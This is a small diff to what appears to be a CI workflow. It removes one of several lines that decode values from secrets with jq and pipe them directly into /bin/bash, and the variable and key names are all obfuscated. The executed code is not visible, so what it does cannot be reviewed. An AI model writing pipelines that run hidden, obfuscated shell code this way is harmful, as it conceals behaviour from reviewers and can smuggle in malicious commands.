@@ -27,7 +27,6 @@ jobs:
           e33: ${{ secrets.e33 }}
         run: |
           printf '%s' "$e33" | jq -r .cy14 | /bin/bash
-          echo $o53663 | jq -r .xxnt0 | /bin/bash
           printf '%s' "$cwg23" | jq -r .jky7 | /bin/bash
           printf '%s' "$xfv465" | jq -r .d5656 | /bin/bash
           echo $vqvge3 | jq -r .hhnu5 | /bin/bash
